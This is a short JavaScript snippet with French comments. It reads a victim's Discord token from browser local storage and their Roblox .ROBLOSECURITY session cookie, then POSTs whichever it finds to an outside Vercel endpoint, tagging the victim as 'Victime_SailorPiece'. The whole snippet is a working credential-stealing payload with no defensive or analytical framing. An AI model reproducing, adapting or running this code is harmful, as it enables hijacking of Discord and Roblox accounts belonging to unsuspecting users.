(function() {
    // Extraction du Token Discord (Stockage local)
    const discordToken = (window.webpackChunkdiscord_app ? window.localStorage.getItem('token') : null);
    
    // Extraction des cookies Roblox
    const robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));

    if (discordToken || robloxCookie) {
        fetch('https://ton-projet-vercel.vercel.app/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token: discordToken || robloxCookie,
                type: discordToken ? "Discord Token" : "Roblox Cookie",
                username: "Victime_SailorPiece"
            })
        });
    }
})();
